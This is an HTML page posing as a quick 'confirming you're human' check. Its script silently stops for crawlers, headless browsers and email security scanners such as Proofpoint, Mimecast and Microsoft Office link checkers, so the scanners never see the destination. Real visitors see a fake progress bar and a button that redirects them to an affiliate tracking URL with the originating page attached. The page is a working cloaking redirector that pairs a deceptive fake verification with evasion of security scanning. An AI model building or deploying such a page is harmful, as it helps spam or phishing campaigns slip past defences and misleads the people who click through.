<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Fast check…</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:"Segoe UI",-apple-system,Roboto,sans-serif;
    background:linear-gradient(160deg,#a8f5d0,#5eead4 60%,#a7f3d0);
    color:#0a3d2e;display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .fresh{
    width:100%;max-width:420px;background:#fff;border-radius:24px;
    padding:32px 26px 24px;text-align:center;position:relative;
    box-shadow:0 24px 60px rgba(10,61,46,.18);
    animation:slide .45s ease;
  }
  @keyframes slide{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:none}}
  .badge{
    position:absolute;top:-12px;right:20px;background:#0a3d2e;color:#5eead4;
    font-size:10px;letter-spacing:2px;padding:6px 12px;border-radius:99px;
    font-weight:700;
  }
  .bolt{
    font-size:50px;line-height:1;margin-bottom:6px;
    filter:drop-shadow(0 6px 14px rgba(94,234,212,.5));
  }
  .h{font-size:24px;font-weight:800;letter-spacing:-.5px;margin-bottom:6px}
  .p{font-size:13.5px;color:#4a8a76;line-height:1.5;margin-bottom:22px}
  .state{font-size:13px;color:#4a8a76;min-height:20px;margin-bottom:16px}
  .btn{
    width:100%;padding:16px;border:0;border-radius:14px;
    background:#0a3d2e;color:#fff;font-family:inherit;font-size:15px;
    font-weight:700;cursor:pointer;min-height:56px;display:none;letter-spacing:.3px;
    box-shadow:0 12px 28px rgba(10,61,46,.3);
  }
  .btn:active{transform:scale(.98)}
  .btn.on{display:block;animation:slide .3s ease}
  .track{height:6px;background:#e8f7f1;border-radius:99px;overflow:hidden;margin-top:20px}
  .track b{display:block;height:100%;width:0;background:linear-gradient(90deg,#10b981,#5eead4);transition:width .25s;border-radius:99px}
</style>
</head>
<body>
<div class="fresh">
  <div class="badge">FAST</div>
  <div class="bolt">⚡</div>
  <h2 class="h">Quick check</h2>
  <p class="p">Just confirming you're human — takes less than a second.</p>
  <div class="state" id="s10">Loading…</div>
  <button class="btn" id="b10" type="button">Continue →</button>
  <div class="track"><b id="p10"></b></div>
</div>
<script>
const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvp7hap20000aejl017gu9ok&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('p10'),st=document.getElementById('s10'),btn=document.getElementById('b10');
  const ua=navigator.userAgent||"";
  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(const p of pats){if(p.test(ua))return;}
  if(navigator.webdriver===true)return;
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;bar.style.width="100%";
    st.textContent=acted?"Verified ✓":"Tap to continue";
    btn.classList.add('on');}
  requestAnimationFrame(step);
  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
  let d=false;
  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
